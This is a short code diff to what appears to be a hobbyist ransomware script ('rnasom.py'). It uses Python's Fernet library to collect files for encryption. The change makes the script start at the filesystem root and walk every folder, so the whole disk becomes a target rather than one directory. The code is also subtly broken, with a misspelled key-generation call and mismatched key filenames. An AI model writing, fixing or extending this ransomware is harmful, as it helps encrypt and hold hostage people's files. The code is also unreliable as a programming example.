@@ -2,18 +2,22 @@ import os
 from cryptography.fernet import Fernet
 
 files = []
+
+rootDir = os.path.abspath(os.sep)
+os.chdir(rootDir)
 isKeyAvailable = False
-for file in os.listdir():
-    if file == "rnasom.py" or file == "decrypt.py":
-        continue
-    elif file == 'thekey.key':
-        keyFile = open('theKey.key', 'rb') 
-        isKeyAvailable = True
-        key = keyFile.read()
-        keyFile.close()
-    elif os.path.isfile(file):
-        files.append(file)
-        print(files)
+for foldername, subfolder, filename in os.walk('.'):
+    for file in filename:
+        if file == "rnasom.py" or file == "decrypt.py":
+            continue
+        elif file == 'thekey.key':
+            keyFile = open('theKey.key', 'rb') 
+            isKeyAvailable = True
+            key = keyFile.read()
+            keyFile.close()
+        elif os.path.isfile(file):
+            files.append(file)
+            print(files)
         
 if isKeyAvailable == False:
     key = Fernet.genrate_key()
